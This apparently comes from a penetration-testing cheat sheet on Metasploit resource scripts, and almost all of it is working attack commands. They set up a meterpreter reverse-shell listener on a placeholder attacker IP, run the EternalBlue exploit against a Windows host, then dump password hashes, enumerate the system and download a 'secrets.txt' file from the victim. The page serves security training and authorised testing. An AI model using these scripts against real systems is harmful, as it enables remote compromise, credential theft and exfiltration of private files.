# Metasploit Resource Scripts

!!! tip ""
    Resource scripts automate repetitive Metasploit workflows. Save a sequence of `set` and `run` commands to a `.rc` file, then: `msfconsole -r script.rc`. Most useful for setting up persistent multi/handler listeners.

---

## Basic Structure

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
set ExitOnSession false
exploit -j
```

Save as `handler.rc` and run:

```bash
msfconsole -r handler.rc
```

---

## EternalBlue Script

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
run
```

---

## Post-Exploitation Automation

```bash
use post/windows/gather/hashdump
set SESSION 1
run

use post/windows/gather/enum_system
set SESSION 1
run
```

---

## File Transfer via Session

```bash
use post/windows/manage/download
set SESSION 1
set REMOTE_FILE C:\\Users\\Admin\\Documents\\secrets.txt
set LOCAL_DIRECTORY /tmp/
run
```

---

## Run Multiple Scripts in Sequence

```bash
for script in /tmp/scripts/*.rc; do
    msfconsole -r "$script"
done
```
